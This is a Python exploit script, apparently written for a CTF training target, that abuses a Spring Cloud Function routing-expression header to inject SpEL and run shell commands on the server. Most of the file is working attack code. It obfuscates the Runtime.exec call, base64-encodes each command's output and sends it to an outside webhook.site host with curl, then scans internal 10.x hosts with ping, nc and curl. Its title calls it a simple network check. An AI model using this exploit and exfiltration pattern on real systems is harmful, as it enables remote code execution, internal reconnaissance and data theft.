#!/usr/bin/env python3
"""
CTF Chile - Verificación simple de red
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    r = requests.post(ROUTER, headers={
        "spring.cloud.function.routing-expression": p,
        "Content-Type": "text/plain",
    }, data="x", timeout=15)
    print(f"[+] {tag} http {r.status_code}")

print("[*] Verificación de conectividad...")
probe("ping_10_160_209_1", "ping -c 2 10.160.209.1")
probe("ping_10_109_220_1", "ping -c 2 10.109.220.1")

print("[*] Verificación de puertos...")
probe("ports_10_160_209_1", "nc -zv 10.160.209.1 22 80 8080 443 3306 2>/dev/null | head -5")
probe("ports_10_109_220_1", "nc -zv 10.109.220.1 22 80 8080 443 3306 2>/dev/null | head -5")

print("[*] Verificación web...")
probe("web_curl_10_160_209_1", "curl -s -I http://10.160.209.1/ 2>/dev/null | head -3")
probe("web_curl_10_109_220_1", "curl -s -I http://10.109.220.1/ 2>/dev/null | head -3")

print("[*] Verificación web puerto 8080...")
probe("web8080_10_160_209_1", "curl -s http://10.160.209.1:8080/ 2>/dev/null | head -5")
probe("web8080_10_109_220_1", "curl -s http://10.109.220.1:8080/ 2>/dev/null | head -5")

time.sleep(15)

# Análizar respuestas
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=15", timeout=10)
data = r.json().get("data", [])

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print(f"\n=== {path} ===")
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)
        except:
            print(f"Decode error: {raw[:100]}")

print(f"\nManual: https://webhook.site/#!/{UUID}")